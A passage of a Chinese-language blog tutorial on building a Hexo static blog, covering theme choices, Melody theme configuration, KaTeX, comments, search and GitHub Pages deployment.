href="https://github.com/theme-next/hexo-theme-next">NexT</a>：极简风，功能集成多。缺点是太过简单界面不漂亮。<a href="https://github.com/theme-next/hexo-theme-next/tree/master/docs/zh-CN">配置帮助文档</a><ul><li>设置CDN</li><li>数学公式：MathJax、Katex</li><li>评论：Disqus、DisqusJS、LiveRe、Gitalk、Valine (China)、Changyan (China)</li><li>分析：Google Analytics、Baidu Analytics (China)、Growingio Analytics、CNZZ Analytics (China)</li><li>统计：LeanCloud (China)、Firebase、Busuanzi Counting</li><li>发布工具：Widgetpack Rating、AddThis</li><li>搜索工具：Algolia Search、Local Search、Swiftype</li><li>聊天工具：Chatra、Tidio</li><li>其他工具：PJAX、Fancybox、MediumZoom、Lazyload、Pangu Autospace、Quicklink、Motion、Progress bar、Backgroud JS</li></ul></li><li><a href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a>[配置帮助文档]：基于Molunerfinn的hexo-theme-melody的基础上进行开发的。(<a href="https://docs.jerryc.me/#/zh-cn/">https://docs.jerryc.me/#/zh-cn/</a>)<ul><li>标签外挂（Tag Plugins）：Note (Bootstrap Callout)、Gallery相册图库、Gallery相册、mermaid</li><li>评论：Disqus、Disqusjs、Laibili（来必力）、Gitalk、Valine、Utterances、Facebook Comments</li><li>分享：AddThis、Sharejs、Addtoany</li><li>搜索系统：Algolia、本地搜索</li><li>网站验证</li><li>分析统计：百度统计、谷歌分析、腾讯分析</li><li>广告：谷歌广告、手动广告配置</li><li>数学公式：MathJax、KaTeX</li><li>美化/特效：自定义主题色、网站背景、footer 背景、打字效果、静止彩带、动态彩带、canvas-nest、鼠标点击效果、页面美化、自定义字体、网站副标题、主页top_img显示大小、页面加载动画preloader</li><li>PWA</li><li>字数统计</li><li>图片大图查看模式：fancybox、medium_zoom</li><li>Snackbar 弹窗</li><li>豆瓣</li><li>Inject</li><li>CDN</li></ul></li><li><a href="https://github.com/fluid-dev/hexo-theme-fluid">Fluid</a>：是基于 Hexo 的一款 Material Design 风格的主题，界面简洁，展示效果不错<a href="https://hexo.fluid-dev.com/docs/">配置帮助文档</a></li><li>本地搜索</li><li>在线聊天：daovoice</li><li>Tag 插件</li><li>LaTeX 数学公式</li><li>Mermaid 流程图</li><li>音乐播放器</li><li><a href="https://github.com/Molunerfinn/hexo-theme-melody">Melody</a>：简洁大方，丰富的第三方支持。<a href="https://molunerfinn.com/hexo-theme-melody-doc/">配置帮助文档</a><ul><li>评论系统：Disqus、Laibili（来必力）、Gitment、Gitalk、Valine</li><li>分享系统：AddThis、Sharejs</li><li>搜索系统：Algolia、本地搜索</li><li>分析统计：百度统计、谷歌分析、腾讯分析</li><li>广告：谷歌广告、访问日志(UV 和 PV)、busuanzi</li><li>数学公式：MathJax、KaTeX</li><li>字数统计</li><li>文章置顶</li><li>相册</li><li><a href="https://liwenhau.github.io/2019/11/15/blogAddMusic/">添加音乐</a></li><li><a href="https://liwenhau.github.io/2020/02/27/video1/#%E6%98%9F%E6%98%9F%E8%BF%98%E6%98%AF%E9%82%A3%E4%B9%88%E4%BA%AE%EF%BC%88Cover-%E7%88%B1%E5%A6%82%E6%BD%AE%E6%B0%B4%EF%BC%89">视频播放</a></li></ul></li></ul></li></ul><h5 id="主题配置"><a class="markdownIt-Anchor" href="#主题配置"></a> 主题配置</h5><ul><li>我选择了Melody作为博客的主题，记录几个主要的配置。</li></ul><h6 id="平滑升级"><a class="markdownIt-Anchor" href="#平滑升级"></a> 平滑升级</h6><ul><li>Melody支持平滑升级，由于<code>_config.yml</code>配置文件会根据用户更改，在<code>git pull</code>时会要求commit和merge。解决方法是将主题文件的<code>_config.yml</code>复制到hexo工作目录下的<code>source/_data/melody.yml</code>，没有<code>_data</code>就创建一个。之后用<code>git pull</code>就可以平滑升级了。</li></ul><h6 id="创建分类页"><a class="markdownIt-Anchor" href="#创建分类页"></a> 创建分类页</h6><ul><li>分类页<br /><code>hexo new page categories</code></li><li>修改<code>source/categories/index.md</code>这个文件</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: 分类</span><br><span class="line">date: 2018-01-05 00:00:00</span><br><span class="line">type: &quot;categories&quot;</span><br><span class="line">---</span><br></pre></td></tr></table></figure><ul><li>标签页<br /><code>hexo new page tags</code></li><li>修改<code>source/tages/index.md</code>这个文件</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: 标签</span><br><span class="line">date: 2018-01-05 00:00:00</span><br><span class="line">type: &quot;tags&quot;</span><br><span class="line">---</span><br></pre></td></tr></table></figure><ul><li>相册页<br /><code>hexo new page gallery</code></li><li>修改<code>source/gallery/index.md</code>这个文件</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: Gallery</span><br><span class="line">date: 2018-01-05 00:00:00</span><br><span class="line">type: &quot;gallery&quot;</span><br><span class="line">---</span><br></pre></td></tr></table></figure><ul><li>melody 提供了一个叫做<code>gallery</code>的标签，让你能够在<code>markdown</code>文件里生成<code>gallery-item</code>。修改你刚刚创建的<code>source/gallery/index.md</code>，并加上<code>gallery</code> 标签。</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% gallery img-url [title] %&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: Gallery </span><br><span class="line">date: 2018-01-05 00:00:00</span><br><span class="line">type: &quot;gallery&quot;</span><br><span class="line">---</span><br><span class="line">&#123;% gallery https:&#x2F;&#x2F;ws1.sinaimg.cn&#x2F;large&#x2F;8700af19gy1fp5i6o2vghj20ea0eajse melody %&#125;</span><br><span class="line">&#123;% gallery https:&#x2F;&#x2F;user-images.githubusercontent.com&#x2F;12621342&#x2F;37325500-23e8f77c-26c9-11e8-8e24-eb4346f1fff5.png background %&#125;</span><br><span class="line">&#123;% gallery https:&#x2F;&#x2F;ws1.sinaimg.cn&#x2F;large&#x2F;8700af19gy1fp5i64zaxqj20b40b474b demo1 %&#125;</span><br><span class="line">&#123;% gallery https:&#x2F;&#x2F;ws1.sinaimg.cn&#x2F;large&#x2F;8700af19ly1fn2h26q32uj21120kudqq demo2 %&#125;</span><br><span class="line">&#123;% gallery https:&#x2F;&#x2F;ws1.sinaimg.cn&#x2F;large&#x2F;8700af19ly1fnhdaimi40j218g0p0dic demo3 %&#125;</span><br><span class="line">&#123;% gallery https:&#x2F;&#x2F;ws1.sinaimg.cn&#x2F;large&#x2F;8700af19ly1fn2i5kjh2pj21120kuncd %&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-7.png" alt="效果图" /></p><ul><li>404页<br /><code>hexo new page 404</code></li><li>修改<code>source/404/index.md</code>这个文件</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: 404</span><br><span class="line">date: 2019-10-13 15:49:05</span><br><span class="line">layout: 404</span><br><span class="line">permalink: &#x2F;404</span><br><span class="line">---</span><br></pre></td></tr></table></figure><h6 id="配置文件"><a class="markdownIt-Anchor" href="#配置文件"></a> 配置文件</h6><ul><li><p>更改主题文件夹下的配置文件<code>_config.yml</code></p></li><li><p>语言</p><ul><li>默认语言是：<code>en</code>，支持列表：</li></ul></li></ul><table><thead><tr><th>语言</th><th>参数</th></tr></thead><tbody><tr><td>英语</td><td>en</td></tr><tr><td>简体中文</td><td>zh-Hans</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">language: en</span><br></pre></td></tr></table></figure><ul><li>代码高亮主题<ul><li>Melody支持5种代码高亮主题：default、darker、pale night、light、ocean (从v1.5.5开始支持)</li></ul></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">highlight_theme: default # default&#x2F;darker&#x2F;pale night&#x2F;light</span><br></pre></td></tr></table></figure><ul><li>代码换行<ul><li>如果你不希望在代码块的区域里有横向滚动条的话，那么你可以考虑开启这个功能。</li></ul></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">code_word_wrap: true</span><br></pre></td></tr></table></figure><ul><li>然后找到你站点的hexo配置文件_config.yml，将line_number改成false:</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">highlight:</span><br><span class="line">  enable: true</span><br><span class="line">  line_number: false # &lt;- 改这里</span><br><span class="line">  auto_detect: false</span><br><span class="line">  tab_replace:</span><br></pre></td></tr></table></figure><ul><li><p>接着运行一下hexo clean后再运行hexo g生成新的文章。</p></li><li><p>社交图标</p><ul><li>如果你只想使用<code>v4</code>的图标, 你只要访问<a href="https://fontawesome.com/v4.7.0/"><code>font-awesome v4</code></a>去找图标名，并且图标前缀通常就是 fa。举个例子, 配置 melody.yml：</li></ul></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">social:</span><br><span class="line">  github fa: https:&#x2F;&#x2F;github.com&#x2F;Molunerfinn</span><br><span class="line">  weibo fa: http:&#x2F;&#x2F;weibo.com&#x2F;mybluedreams</span><br><span class="line">  rss fa: https:&#x2F;&#x2F;Molunerfinn&#x2F;atom.xml</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure><ul><li>导航菜单<ul><li>在右上角的区域是导航菜单项。Hexo有默认的/和/archives的路径。配置melody.yml</li></ul></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">menu:</span><br><span class="line">  Home: &#x2F;</span><br><span class="line">  Archives: &#x2F;archives</span><br><span class="line">  Tags: &#x2F;tags</span><br><span class="line">  Categories: &#x2F;categories</span><br></pre></td></tr></table></figure><ul><li>你也可以修改菜单项名称，比如：</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">menu:</span><br><span class="line">  Blog: &#x2F;</span><br><span class="line">  Posts: &#x2F;archives</span><br><span class="line">  MyTags: &#x2F;tags</span><br><span class="line">  MyCategories: &#x2F;categories</span><br></pre></td></tr></table></figure><ul><li>顶部图<ul><li>顶部图是theme-melody最神奇的配置项. 它拥有<code>true</code>、<code>false</code>或者具体图片<code>url</code>三种值。配置<code>melody.yml</code>：</li></ul></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">top_img: true  &#x2F;&#x2F; true&#x2F;false&#x2F;具体图片url</span><br></pre></td></tr></table></figure><ul><li>顶部图高度控制<ul><li>从 <code>v1.7.0</code> 版本开始，你可以通过设置 <code>top_img_height</code> 来控制顶部图的高度。默认值是 60，意味着顶部图会占据 60% 的页面高度。所以如果你喜欢，你可以设置成 100，这样你就能获得占据整个页面的顶部图了！配置 <code>melody.yml</code>：</li></ul></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">top_img_height: 60</span><br></pre></td></tr></table></figure><ul><li>文章版权<ul><li>为你的博客文章展示文章版权和许可协议。配置<code>melody.yml</code></li></ul></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">post_copyright:</span><br><span class="line">  enable: true</span><br><span class="line">  license: CC BY-NC-SA 3.0 # 协议名称</span><br><span class="line">  license_url: https:&#x2F;&#x2F;creativecommons.org&#x2F;licenses&#x2F;by-nc-sa&#x2F;3.0&#x2F; # 协议说明地址</span><br></pre></td></tr></table></figure><ul><li>文章广告区<ul><li>在你的文章页面里加上广告！你可以放置一个你自己想展示的广告或者也可以是个音乐播放器等等。不过没研究出来怎么放音乐播放器。</li></ul></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">adv:</span><br><span class="line">  enable: true</span><br><span class="line">  info: &lt;a href&#x3D;&quot;https:&#x2F;&#x2F;www.vultr.com&#x2F;?ref&#x3D;7231808&quot;&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;www.vultr.com&#x2F;media&#x2F;banner_1.png&quot; width&#x3D;&quot;728&quot; height&#x3D;&quot;90&quot;&gt;&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure><ul><li>头像<ul><li>最好是长宽相等的头像</li></ul></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">avatar: https:&#x2F;&#x2F;xxxx.jpg</span><br></pre></td></tr></table></figure><ul><li>友链<ul><li>你可以在侧边栏配置相应的友情链接。格式如下：</li></ul></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">links_title: Links   # 配置友链的标题文字</span><br><span class="line">links:</span><br><span class="line">  Molunerfinn: https:&#x2F;&#x2F;molunerfinn.com # 名称：URL</span><br><span class="line">  PiEgg: https:&#x2F;&#x2F;piegg.cn</span><br><span class="line">  Elody: https:&#x2F;&#x2F;piegg.cn</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-8.png" alt="友链效果图" /></p><ul><li>目录<ul><li>你的文章能够拥有一个清晰的目录列表。目录位于侧边栏，并且会随着滚动条的滚动自动展开目录结构。</li></ul></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">toc:</span><br><span class="line">  enable: true # or false</span><br><span class="line">  number: true # or false. 版本v1.5.6新增</span><br></pre></td></tr></table></figure><ul><li>为特定的文章配置特定的目录章节数字，在你的文章md文件的头部，加入toc_number项，并配置<code>true</code>或者<code>false</code>即可。</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">title: Hi, theme-melody!</span><br><span class="line">tags:</span><br><span class="line">  - hexo</span><br><span class="line">  - hexo theme</span><br><span class="line">toc_number: false   # &lt; add toc_number to here. 版本v1.5.6新增</span><br><span class="line">date: 2017-09-07</span><br><span class="line">---</span><br></pre></td></tr></table></figure><ul><li>页脚自定义文本 <code>v1.5.5+</code><ul><li><code>footer_custom_text</code>是一个给你用来在页脚自定义文本的选项。通常你可以在这里写ICP备案号、码云声明文本等。支持HTML。</li></ul></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">footer_custom_text: Hi, welcome to my &lt;a href&#x3D;&quot;https:&#x2F;&#x2F;molunerfinn.com&quot;&gt;blog&lt;&#x2F;a&gt;!</span><br></pre></td></tr></table></figure><ul><li>如果你配置成<code>hitokoto</code>，那么底部文字将会生成随机的谚语：</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">footer_custom_text: hitokoto</span><br></pre></td></tr></table></figure><ul><li>特效<ul><li>点击效果</li></ul></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fireworks: true # 烟花</span><br><span class="line">canvas_ribbon: # 彩带</span><br><span class="line">  enable: true</span><br><span class="line">  size: 150</span><br><span class="line">  alpha: 0.6</span><br><span class="line">  zIndex: -1</span><br><span class="line">  click_to_change: false</span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="第三方支持"><a class="markdownIt-Anchor" href="#第三方支持"></a> 第三方支持</h6><ul><li>评论系统<ul><li>Melody支持多种评论系统，我这里选择Valine</li></ul></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">valine:</span><br><span class="line">  enable: false # if you want use valine,please set this value is ture</span><br><span class="line">  appId: # leancloud application app id</span><br><span class="line">  appKey: # leancloud application app key</span><br><span class="line">  notify: false # valine mail notify (true&#x2F;false) https:&#x2F;&#x2F;github.com&#x2F;xCss&#x2F;Valine&#x2F;wiki</span><br><span class="line">  verify: false # valine verify code (true&#x2F;false)</span><br><span class="line">  pageSize: 10 # comment list page size</span><br><span class="line">  avatar: mm # gravatar style https:&#x2F;&#x2F;valine.js.org&#x2F;#&#x2F;avatar</span><br><span class="line">  lang: zh-cn # i18n: zh-cn&#x2F;en</span><br><span class="line">  placeholder: Just go go # valine comment input placeholder(like: Please leave your footprints )</span><br><span class="line">  guest_info: nick,mail,link #valine comment header in</span><br></pre></td></tr></table></figure><ul><li>搜索系统<ul><li>这里使用本地搜索，需要安装<code>hexo-generator-search</code>. 根据它的文档去做相应配置。注意格式只支持 xml。</li></ul></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">local_search:</span><br><span class="line">  enable: true # or false</span><br><span class="line">  labels:</span><br><span class="line">    input_placeholder: Search for Posts</span><br><span class="line">    hits_empty: &quot;We didn&#39;t find any results for the search: $&#123;query&#125;&quot; # if there are no result</span><br></pre></td></tr></table></figure><ul><li>hexo项目的<code>_config.yml</code>配置：</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">search:</span><br><span class="line">  path: search.xml</span><br><span class="line">  field: post</span><br></pre></td></tr></table></figure><ul><li>分析统计<ul><li>这里使用百度分析，登录百度统计的官方网站，找到你百度统计的统计代码</li></ul></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">baidu_analytics: 你的代码</span><br></pre></td></tr></table></figure><ul><li>数学公式<ul><li>原先编写公式都是使用的MathJax，主题文档里推荐的KeTeX，比MathJax更轻量，加载页面更优越一下，这次就选KeTex。</li><li>首先禁用MathJax（如果你配置过 MathJax 的话），然后修改你的melody.yml以便加载katex.min.css:</li></ul></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">katex:</span><br><span class="line">  enable: true</span><br><span class="line">  cdn:</span><br><span class="line">    css: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;katex@latest&#x2F;dist&#x2F;katex.min.css</span><br></pre></td></tr></table></figure><ul><li>你不需要添加katex.min.js来渲染数学方程。相应的你需要卸载你之前的 hexo 的 markdown 渲染器以及hexo-math，然后安装新的hexo-renderer-markdown-it-plus:</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 替换 &#96;hexo-renderer-kramed&#96; 或者 &#96;hexo-renderer-marked&#96; 等hexo的markdown渲染器</span><br><span class="line"># 你可以在你的package.json里找到hexo的markdwon渲染器，并将其卸载</span><br><span class="line">npm un hexo-renderer-marked --save</span><br><span class="line"># or</span><br><span class="line">npm un hexo-renderer-kramed --save</span><br><span class="line"># 卸载 &#96;hexo-math&#96;</span><br><span class="line">npm un hexo-math --save</span><br><span class="line"># 然后安装 &#96;hexo-renderer-markdown-it-plus&#96;</span><br><span class="line">npm i @upupming&#x2F;hexo-renderer-markdown-it-plus --save</span><br></pre></td></tr></table></figure><ul><li>注意到 hexo-renderer-markdown-it-plus 已经无人持续维护, 所以我们使用 @upupming/hexo-renderer-markdown-it-plus。 这份 fork 的代码使用了 @neilsustc/markdown-it-katex 同时它也是 VSCode 的插件Markdown All in One所使用的, 所以我们可以获得最新的 KaTex 功能例如 \tag{}。</li><li>你还可以通过 @neilsustc/markdown-it-katex 控制 KaTeX 的设置，所有可配置的选项参见：<a href="https://katex.org/docs/options.html">katex官网</a>。 比如你想要禁用掉 KaTeX 在命令行上输出的冗长的警告信息，你可以在根目录的 _config.yml 中使用下面的配置将 strict 设置为 false:</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">markdown_it_plus:</span><br><span class="line">  plugins:</span><br><span class="line">    - plugin:</span><br><span class="line">      name: &quot;@neilsustc&#x2F;markdown-it-katex&quot;</span><br><span class="line">      enable: true</span><br><span class="line">      options:</span><br><span class="line">        strict: false</span><br></pre></td></tr></table></figure><ul><li><p>当然，你还可以利用这个特性来定义一些自己常用的 macros。因为 KaTeX 更快更轻量，因此没有 MathJax 的功能多（比如右键菜单）。为那些使用 MathJax 的用户，我们也为 KaTeX 默认添加了 Copy As TeX Code 的功能。</p></li><li><p>字数统计 v1.3.0+</p><ul><li>打开 hexo 工作目录：<code>npm install hexo-wordcount --save</code> or <code>yarn add hexo-wordcount</code>，配置melody.yml:</li></ul></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wordcount:</span><br><span class="line">  enable: true</span><br></pre></td></tr></table></figure><ul><li>文章置顶 v1.6.0+<ul><li>打开 hexo 工作目录<code>npm uninstall hexo-generator-index --save</code>，然后<code>npm install hexo-generator-index-pin-top --save</code>。在文章的front-matter区域里添加top: True属性来把这篇文章置顶。</li></ul></li></ul><h4 id="部署配置deploy"><a class="markdownIt-Anchor" href="#部署配置deploy"></a> 部署配置（deploy）</h4><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>type</td><td>git</td></tr><tr><td>repo</td><td>仓库路径</td></tr><tr><td>branch</td><td>分支名称</td></tr></tbody></table><ul><li>deploy是网站的部署的，repo就是仓库(Repository)的简写。branch选择仓库的哪个分支。配置这两个值我们就可以将hexo和GitHub关联起来，也就是将hexo生成的文章部署到GitHub上，</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: https:&#x2F;&#x2F;github.com&#x2F;YourgithubName&#x2F;YourgithubName.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure><h4 id="文件配置"><a class="markdownIt-Anchor" href="#文件配置"></a> 文件配置</h4><ul><li>Front-matter是文件最上方以 <code>---</code> 分隔的区域，用于指定个别文件的变量：</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">title: Hello World</span><br><span class="line">date: 2013&#x2F;7&#x2F;13 20:46:25</span><br><span class="line">---</span><br></pre></td></tr></table></figure><ul><li>以下是预先定义的参数，您可在模板中使用这些参数值并加以利用</li></ul><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>layout</td><td>布局</td></tr><tr><td>title</td><td>标题</td></tr><tr><td>date</td><td>建立日期</td></tr><tr><td>updated</td><td>更新日期</td></tr><tr><td>comments</td><td>开启文章的评论功能</td></tr><tr><td>tags</td><td>标签（不适用于分页）</td></tr><tr><td>categories</td><td>分类（不适用于分页）</td></tr><tr><td>permalink</td><td>覆盖文章网址</td></tr></tbody></table><h4 id="布局配置"><a class="markdownIt-Anchor" href="#布局配置"></a> 布局配置</h4><ul><li>Hexo 有三种默认布局：post、page 和 draft，它们分别对应不同的路径，而您自定义的其他布局和 post 相同，都将储存到 source/_posts 文件夹。</li></ul><table><thead><tr><th>布局</th><th>路径</th></tr></thead><tbody><tr><td>post</td><td>source/_posts</td></tr><tr><td>page</td><td>source</td></tr><tr><td>draft</td><td>source/_drafts</td></tr></tbody></table><h5 id="post"><a class="markdownIt-Anchor" href="#post"></a> post</h5><ul><li>layout布局默认是post类型，也就是使用代码<code>hexo new paper</code>创建的文章，会在source文件夹下的_post里面。</li><li>而new这个命令其实是：</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo new [layout] [title]</span><br></pre></td></tr></table></figure><ul><li>只不过这个layout默认是post罢了。</li></ul><h5 id="page"><a class="markdownIt-Anchor" href="#page"></a> page</h5><ul><li>如果你想另起一页，那么可以使用</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo new page board</span><br></pre></td></tr></table></figure><ul><li>系统会自动给你在source文件夹下创建一个board文件夹，<a href="http://xn--boardindex-zt2p02eqgs45dlht758bqmyd.md">以及board文件夹中的index.md</a>，这样你访问的board对应的链接就是http://xxx.xxx/board</li></ul><h5 id="draft"><a class="markdownIt-Anchor" href="#draft"></a> draft</h5><ul><li>draft是草稿的意思，也就是你如果想写文章，又不希望被看到，那么可以</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo new draft newpage</span><br></pre></td></tr></table></figure><ul><li>这样会在source/_draft中新建一个newpage.md文件，如果你的草稿文件写的过程中，想要预览一下，那么可以使用</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo server --draft</span><br></pre></td></tr></table></figure><ul><li>在本地端口中开启服务预览。</li><li>如果你的草稿文件写完了，想要发表到post中，</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo publish draft newpage</span><br></pre></td></tr></table></figure><ul><li>就会自动把newpage.md发送到post中。</li></ul><h4 id="菜单栏menu"><a class="markdownIt-Anchor" href="#菜单栏menu"></a> 菜单栏（menu）</h4><ul><li>可以配置页面的导航，其中，About这个你是找不到网页的，因为你的文章中没有about这个东西。如果你想要的话，可以执行命令</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo new page about</span><br></pre></td></tr></table></figure><ul><li>它就会在根目录下source文件夹中新建了一个<code>about</code>文件夹，以及<code>index.md</code>，在<code>index.md</code>中写上你想要写的东西，就可以在网站上展示出来了。</li><li>如果你想要自己再自定义一个菜单栏的选项，那么就</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo new page yourdiy</span><br></pre></td></tr></table></figure><ul><li>然后在主题配置文件的menu菜单栏添加一个 <code>Yourdiy : /yourdiy</code>，注意冒号后面要有空格，以及前面的空格要和<code>menu</code>中默认的保持整齐。然后在<code>languages</code>文件夹中，找到<code>zh-CN.yml</code>，在<code>index</code>中添加<code>yourdiy: '中文意思'</code>就可以显示中文了。</li></ul><h4 id="定制customize"><a class="markdownIt-Anchor" href="#定制customize"></a> 定制（customize）</h4><ul><li>在这里可以修改你的个人<code>logo</code>，在<code>source/css/images</code>文件夹中放入自己要的<code>logo</code>，再改一下<code>url</code>的链接名字就可以了。</li><li><code>favicon</code>是网站中出现的那个小图标的<code>icon</code>，找一张你喜欢的<code>logo</code>，然后转换成<code>ico</code>格式，放在<code>images</code>文件夹下，配置一下路径就行。</li><li><code>social_links</code> 可以显示你的社交链接，而且是有<code>logo</code>的。</li></ul><h4 id="侧边栏widgets"><a class="markdownIt-Anchor" href="#侧边栏widgets"></a> 侧边栏(widgets)</h4><ul><li>侧边栏的小标签，如果你想自己增加一个，比如我增加了一个联系方式，那么我把<code>communication</code>写在上面，在<code>zh-CN.yml</code>中的<code>sidebar</code>，添加<code>communication: '中文'</code>。</li><li>然后在<code>hueman/layout/widget</code>中添加一个<code>communicaiton.ejs</code>，填入模板：</li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">-</span> % <span class="attr">if</span> (<span class="attr">site.posts.length</span>) &#123; % &gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">-div</span> <span class="attr">class</span>=<span class="string">&quot;widget-wrap widget-list&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">-h3</span> <span class="attr">class</span>=<span class="string">&quot;widget-title&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">-%=</span> <span class="attr">__</span>(&#x27;<span class="attr">sidebar.communiation</span>&#x27;) %<span class="attr">-</span>&gt;</span><span class="tag">&lt;<span class="name">-</span>/<span class="attr">h3</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">-div</span> <span class="attr">class</span>=<span class="string">&quot;widget&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">-!--这里添加你要写的内容---</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">-</span>/<span class="attr">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">-</span>/<span class="attr">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">-</span> % &#125; % &gt;</span></span><br></pre></td></tr></table></figure><h4 id="搜索框search"><a class="markdownIt-Anchor" href="#搜索框search"></a> 搜索框(search)</h4><ul><li>默认搜索框是不能够用的，</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">you need to install hexo-generator-json-content before using Insight Search</span><br></pre></td></tr></table></figure><ul><li>它已经告诉你了，如果想要使用，就安装这个插件。</li></ul><h4 id="评论系统comment"><a class="markdownIt-Anchor" href="#评论系统comment"></a> 评论系统(comment)</h4><ul><li>这里的多数都是国外的，基本用不了。这个<code>valine</code>好像不错，还能统计文章阅读量，可以自己试一试，链接。</li></ul><h4 id="如何让博文列表不显示全部内容"><a class="markdownIt-Anchor" href="#如何让博文列表不显示全部内容"></a> 如何让博文列表不显示全部内容</h4><ul><li>默认情况下，生成的博文目录会显示全部的文章内容，如何设置文章摘要的长度呢？答案是在合适的位置加上<code>&lt;!--more--&gt;</code>即可。</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">使用github pages服务搭建博客的好处有：</span><br><span class="line">1. 全是静态文件，访问速度快；</span><br><span class="line">2. 免费方便，不用花一分钱就可以搭建一个自由的个人博客，不需要服务器不需要后台；</span><br><span class="line">3. 可以随意绑定自己的域名，不仔细看的话根本看不出来你的网站是基于github的；</span><br><span class="line">&lt; !--more-- &gt;</span><br><span class="line">4. 数据绝对安全，基于github的版本管理，想恢复到哪个历史版本都行；</span><br><span class="line">5. 博客内容可以轻松打包、转移、发布到其它平台；</span><br><span class="line">6. 等等；</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-6.png" alt="展示结果" /></p><h3 id="指令总结"><a class="markdownIt-Anchor" href="#指令总结"></a> 指令总结</h3><table><thead><tr><th>指令</th><th>简写</th><th>作用</th></tr></thead><tbody><tr><td>init</td><td>i</td><td>初始化，创建一个hexo项目目录，不穿参数，则直接放在当前目录</td></tr><tr><td>new</td><td>n</td><td>默认创建一个post文章</td></tr><tr><td>sever</td><td>s</td><td>启动本地预览服务</td></tr><tr><td>generate</td><td>g</td><td>根据md文件，生成html文件，放在public目录中。可以添加-w参数，实时更新，更加方便</td></tr><tr><td>clean</td><td>c</td><td>清楚之前generate的文件</td></tr><tr><td>deploy</td><td>d</td><td>部署到代码仓库</td></tr></tbody></table><h3 id="表情配置"><a class="markdownIt-Anchor" href="#表情配置"></a> <a href="https://haojen.github.io/2016/09/03/Emoji-Demo/">表情配置</a></h3><ul><li>使用方法:<ul><li>比如你想发一个笑脸😄 直接输入笑脸对应的 emmoji 编码 <code>:smile:</code>就可以。<a href="http://emoji.codes/">查看全部 emoji 表情编码</a></li></ul></li><li>启用 emoji 的方法:<ul><li>卸载默认的<code>markdown</code>引擎: 打开终端, 去往博客的根目录下执行 <code>npm un hexo-renderer-marked --save</code></li><li>然后安装新的解析引擎: <code>npm i hexo-renderer-markdown-it --save</code> 和其<code>emoji</code>插件 : <code>npm install markdown-it-emoji --save</code></li><li>配置<code>_config.yml</code>文件</li></ul></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">markdown: 